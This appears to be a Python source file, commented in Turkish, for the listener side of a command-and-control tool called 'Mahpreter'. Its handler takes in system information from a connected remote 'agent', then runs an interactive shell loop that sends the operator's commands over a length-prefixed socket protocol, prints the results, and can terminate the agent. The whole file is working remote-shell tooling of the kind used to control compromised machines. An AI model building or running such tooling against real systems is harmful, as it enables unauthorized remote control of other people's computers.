from core.handler import BaseHandler
import struct
import threading
import sys
from rich import print

class Handler(BaseHandler):
    """
    Mahpreter için özel handler.
    Length-prefixed protokolü destekler.
    """
    def handle_connection(self, client_sock, session_id=None):
        print(f"[*] Shell oturumu başlatılıyor... (Session: {session_id})")
        
        # İlk olarak sistem bilgisini almayı bekle
        try:
            sysinfo = self.recv_data()
            print(f"[+] Sistem Bilgisi: {sysinfo}")
        except Exception as e:
            print(f"[!] Sistem bilgisi alınamadı: {e}")

        # İnteraktif komut döngüsü
        self.interactive_session()

    def send_data(self, data: str):
        if not self.client_sock: return
        # Veriyi length-prefixed olarak gönder (Protocol: [Len 4 bytes][Data])
        encoded = data.encode('utf-8')
        length = struct.pack('!I', len(encoded))
        self.client_sock.sendall(length + encoded)

    def recv_data(self) -> str:
        if not self.client_sock: return ""
        # Önce uzunluğu oku
        len_data = self.client_sock.recv(4)
        if not len_data: return ""
        length = struct.unpack('!I', len_data)[0]
        
        # Datayı oku
        data = b''
        while len(data) < length:
            chunk = self.client_sock.recv(length - len(data))
            if not chunk: break
            data += chunk
        return data.decode('utf-8')

    def interactive_session(self):
        print("-" * 50)
        print("[*] Komut satırı aktif. Çıkmak için 'exit' veya 'terminate' yazın.")
        print("-" * 50)
        
        while True:
            try:
                cmd = input("mahpreter > ")
                if not cmd.strip(): continue
                
                if cmd == "exit":
                    print("[*] Oturum kapatılıyor...")
                    break
                
                # Komutu gönder
                self.send_data(cmd)
                
                if cmd == "terminate":
                    print("[*] Agent sonlandırılıyor...")
                    break

                # Cevabı bekle (Blocking)
                response = self.recv_data()
                if response:
                    print(response)
                else:
                    print("[!] Bağlantı koptu.")
                    break
            except KeyboardInterrupt:
                print("\n[*] Oturum kullanıcı tarafından kesildi.")
                break
            except Exception as e:
                print(f"[!] Hata: {e}")
                break
